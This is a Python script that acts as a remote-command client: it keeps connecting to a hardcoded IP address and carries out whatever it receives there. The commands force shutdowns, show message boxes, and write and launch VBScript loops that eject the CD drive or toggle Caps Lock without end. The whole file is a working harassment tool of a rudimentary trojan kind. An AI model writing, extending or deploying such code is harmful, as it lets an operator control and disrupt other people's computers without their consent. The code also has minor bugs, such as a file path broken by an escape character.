#!/usr/bin/python
import socket, time, subprocess, sys, os
from pathlib import Path
while True:
    s = socket.socket()
    port = 12345
    try:
        s.connect(('10.64.41.98', port))
        command = s.recv(1024)
        print("Command recieved: "+command)
    except socket.error as err:
        print("Sergeant Commander on a break(Commander offline or unavailable)")
        time.sleep(3)
        continue
    if "cancel" in str(command):
        print("Cancelling shutdown command")
        subprocess.call(["shutdown", "-a"])
        time.sleep(5)
        
    elif "shutdown" in str(command):
        print("Shutting down computer")
        subprocess.call(["shutdown", "-s", "-t", "20"])
        time.sleep(10)
        
    elif "test" in str(command):
        print("Initiating test module")
        subprocess.call(["calc"])
        
    elif "message" in str(command):
        message = command.split(" ",1)
        print message[1]
        path = os.environ["HOMEPATH"]
        finalpathm = "C:"+path+"\Desktop"+"\message.vbs"
        if not os.path.isfile(finalpathm) == True:
            print("message.vbs doesnt exist, creating a new one")
            with open(finalpathm,'w') as f:
                f.write('Set objArgs = WScript.Arguments\n')
                f.write('messageText = objArgs(0)\n')
                f.write('MsgBox messageText')
                f.close
        subprocess.call(["cscript",finalpathm,message[1]])
        
    elif "disable" in str(command):
        sys.exit()
        
    elif "opencd" in str(command):
        path = os.environ["HOMEPATH"]
        finalpatho = "C:"+path+"\Desktop"+"\opencd.vbs"
        if not os.path.isfile(finalpatho) == True:
            print("opencd.vbs doesnt exist, creating a new one")
            with open(finalpatho, 'w') as c:
                c.write('Set oWMP = CreateObject("WMPlayer.OCX.7")\n')
                c.write('Set colCDROMs = oWMP.cdromCollection\n')
                c.write('do\n')
                c.write('if colCDROMs.Count >= 1 then\n')
                c.write('For i = 0 to colCDROMs.Count - 1\n')
                c.write('colCDROMs.Item(i).Eject\n')
                c.write('Next\n')
                c.write('For i = 0 to colCDROMs.Count - 1\n')
                c.write('colCDROMs.Item(i).Eject\n')
                c.write('Next\n')
                c.write('End If\n')
                c.write('wscript.sleep 5000\n')
                c.write('loop')
        os.startfile(finalpatho)
    elif "togglecaps" in str(command):
        path = os.environ["HOMEPATH"]
        finalpatht = "C:"+path+"\Desktop"+"\togglecaps.vbs"
        if not os.path.isfile(finalpatht) == True:
            print("togglecaps.vbs doesnt exist, creating a new one")
            with open(finalpatht, 'w') as t:
                t.write('Set wshShell =wscript.CreateObject("WScript.Shell")\n')
                t.write('do\n')
                t.write('wscript.sleep 100\n')
                t.write('wshshell.sendkeys "{CAPSLOCK}"\n')
                t.write('loop')
        os.startfile(finalpatht)
    time.sleep(10)
    s.close()





    
